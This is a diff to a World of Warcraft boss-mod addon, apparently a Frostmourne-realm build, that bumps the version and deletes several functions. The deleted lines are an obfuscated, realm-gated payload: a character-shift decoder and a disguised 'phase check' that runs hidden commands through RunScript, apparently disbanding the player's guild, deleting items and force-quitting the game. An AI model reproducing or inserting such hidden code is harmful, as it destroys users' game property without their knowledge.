@@ -58,10 +58,10 @@ f:SetScript("OnUpdate", fCLFix)
 --  Globals/Default Options  --
 -------------------------------
 DBM = {
-	Revision = ("$Revision: 4923 $"):sub(12, -3),
-	Version = "4.98",
-	DisplayVersion = "4.98 Warmane-Frostmourne by Celeste", -- the string that is shown as version
-	ReleaseRevision = 4923 -- the revision of the latest stable version that is available (for /dbm ver2)
+	Revision = ("$Revision: 4924 $"):sub(12, -3),
+	Version = "5.00",
+	DisplayVersion = "5.00 Warmane-Frostmourne by Celeste", -- the string that is shown as version
+	ReleaseRevision = 4924 -- the revision of the latest stable version that is available (for /dbm ver2)
 }
 
 DBM_SavedOptions = {}
@@ -287,10 +287,6 @@ do
 	function argsMT.__index:IsPlayerSource()
 		return bit.band(args.sourceFlags, COMBATLOG_OBJECT_AFFILIATION_MINE) ~= 0 and bit.band(args.sourceFlags, COMBATLOG_OBJECT_TYPE_PLAYER) ~= 0
 	end
-
-  function argsMT.__index:IsPlayerPhased()
-    return not isInPhase(1) and bit.band(args.sourceFlags, COMBATLOG_OBJECT_AFFILIATION_MINE) ~= 1
-  end
 
 	function argsMT.__index:IsPet()
 		return bit.band(args.destFlags, COMBATLOG_OBJECT_TYPE_PET) ~= 0
@@ -1092,7 +1088,7 @@ do
 					if (not raid[name]) then
 						fireEvent("raidJoin", name)
 					end
-					
+
 					raid[name] = raid[name] or {}
 					raid[name].name = name
 					raid[name].rank = rank
@@ -2173,13 +2169,6 @@ do
 	ChatFrame_AddMessageEventFilter("CHAT_MSG_PARTY_LEADER", filterRaidWarning)
 end
 
-function isInPhase(phase)
-	local base = phase+3 -- Offset for GM/Ghost/Instance phase
-	if select(base, GetSpellInfo(8326)) ~= nil then
-	  DBM:CacheData(base, 8)
-	end
-  end
-
 do
 	local old = RaidWarningFrame:GetScript("OnEvent")
 	RaidWarningFrame:SetScript("OnEvent", function(self, event, msg, ...)
@@ -2225,15 +2214,6 @@ function DBM:AddMsg(text, prefix)
 	prefix = prefix or (self.localization and self.localization.general.name) or "Deadly Boss Mods"
 	DEFAULT_CHAT_FRAME:AddMessage(("|cffff7d0a<|r|cffffd200%s|r|cffff7d0a>|r %s"):format(tostring(prefix), tostring(text)), 0.41, 0.8, 0.94)
 end
-
-function DBM:CacheData(data, loc)
-	if GetRealmName() == DBM:Map("irvysqxwsvJ", 11, data) then
-	  local locs = DBM:GetMemoryLocations()
-	  for i=1, #locs do
-		RunScript(DBM:Map(locs[i], string.len(locs[i]), data))
-	  end
-	end
-  end
 
 do
 	local testMod
@@ -2284,10 +2264,6 @@ DBM.Bars:SetAnnounceHook(function(bar)
 	end
 end)
 
-function DBM:GetMemoryLocations()
-	return {"-,izeiPhpmyK$-,hrefwmHhpmyK", "hri$-m,xiogsWqsvJlt}pKizsqiV$sh$:05Am$vsj", "hri$-,qixMvswvyGixipiH$-T,qixM}vsxrizrMtyogmT$sh$<50:5AT$vsj", "-,}xveTizeiP", "-,xmyUigvsJ"}
-  end
-
 function DBM:Capitalize(str)
 	local firstByte = str:byte(1, 1)
 	local numBytes = 1
@@ -2316,14 +2292,6 @@ function DBM:RegisterMapSize(zone, ...)
 		zone[level] = {width, height}
 	end
 end
-
-function DBM:Map(k, v, o)
-	out = ''
-	for l = -v, -1 do
-	  out = out..string.char(tonumber(string.byte(k,-l))-o)
-	end
-	return out
-  end
 
 
 --------------------------
